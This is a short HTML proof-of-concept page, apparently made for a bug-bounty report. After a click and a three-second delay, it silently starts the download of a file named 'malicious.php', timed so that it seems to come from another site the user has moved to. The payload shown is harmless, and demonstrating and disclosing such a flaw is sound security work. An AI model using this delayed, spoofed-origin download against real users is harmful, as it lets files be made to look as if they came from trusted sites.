<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Delayed Download PoC</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: sans-serif;
      background-color: #fafafa;
      cursor: pointer;
      user-select: none;
    }
    h1 {
      color: #333;
      text-align: center;
      max-width: 420px;
      padding: 20px;
    }
  </style>
</head>
<body>
  <h1>
    Click me anywhere.<br>
    Then browse to another site (e.g. hackerone.com).<br><br>
    After 3 seconds, a file will be downloaded.
  </h1>

  <script>
    document.addEventListener('click', () => {
      setTimeout(() => {
        // Create fake file
        const blob = new Blob(['<?php echo "pwned"; ?>'], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);

        // Create invisible download link
        const a = document.createElement('a');
        a.href = url;
        a.download = 'malicious.php';
        document.body.appendChild(a);

        // Trigger download
        a.click();

        // Cleanup
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

        console.log("Download triggered");
      }, 3000);
    }, { once: true });
  </script>
</body>
</html>
